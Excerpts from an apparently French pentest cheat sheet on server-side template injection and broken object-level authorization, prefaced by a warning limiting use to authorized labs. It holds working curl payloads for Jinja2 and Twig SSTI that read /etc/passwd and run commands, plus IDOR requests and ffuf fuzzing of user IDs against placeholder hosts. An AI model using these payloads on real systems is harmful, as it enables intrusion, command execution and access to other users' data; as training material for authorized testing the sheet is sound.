...
!!! warning "Cadre légal : lab et autorisation uniquement"
    Les commandes et payloads de cette fiche sont destinés à des **labs autorisés** (DVWA, Juice Shop, PortSwigger Academy, machines HTB/TryHackMe, cibles d'un contrat de pentest). Les hôtes du type `example.com` / `api.example.com` sont des **placeholders fictifs** : ne les remplace jamais par un site réel sans autorisation écrite. En France, l'accès frauduleux à un système est un délit (Code pénal, art. 323-1 et s.).
...
# Twig (PHP) :
curl -s "https://example.com/page?name={{app.request.server.all|join(',')}}"

# === Exploitation Jinja2 (Python) ===
# Lire un fichier
curl -s "https://example.com/page?name={{''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read()}}"

# Exécution de commande (via la classe Popen)
# Trouver l'index de subprocess.Popen dans __subclasses__
curl -s "https://example.com/page?name={{''.__class__.__mro__[1].__subclasses__()}}" | tr ',' '\n' | grep -n Popen

# Exécuter la commande (X = index trouvé)
curl -s "https://example.com/page?name={{''.__class__.__mro__[1].__subclasses__()[X](['id'],stdout=-1).communicate()[0]}}"
```
...
curl -s -H "Authorization: Bearer TOKEN_USER_A" \
  "https://api.example.com/api/users/1/orders"

# Tenter d'accéder aux commandes de l'utilisateur B (ID=2)
curl -s -H "Authorization: Bearer TOKEN_USER_A" \
  "https://api.example.com/api/users/2/orders"
...
ffuf -u "https://api.example.com/api/users?FUZZ=true" \
...
```text
# BOLA détecté :
$ curl -s -H "Authorization: Bearer TOKEN_USER_A" "https://api.example.com/api/users/2/orders"
...
ffuf -u "https://example.com/api/users/FUZZ" \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer TOKEN" \
  -mc 200
...
- Front-end : `https://shop.example.com`
...
```bash
# Mon profil (ID=1)
curl -s -H "Authorization: Bearer TOKEN" "https://api.example.com/v2/users/1"
# {"id": 1, "name": "testuser", "email": "test@example.com"}

# Profil d'un autre utilisateur (ID=2)
curl -s -H "Authorization: Bearer TOKEN" "https://api.example.com/v2/users/2"
...
curl -s "https://shop.example.com/search?q={{7*7}}"
# La page de résultats affiche "Résultats pour : 49"
# -> SSTI confirmé

# Identifier le moteur : Jinja2 (Python)
curl -s "https://shop.example.com/search?q={{config.items()}}"
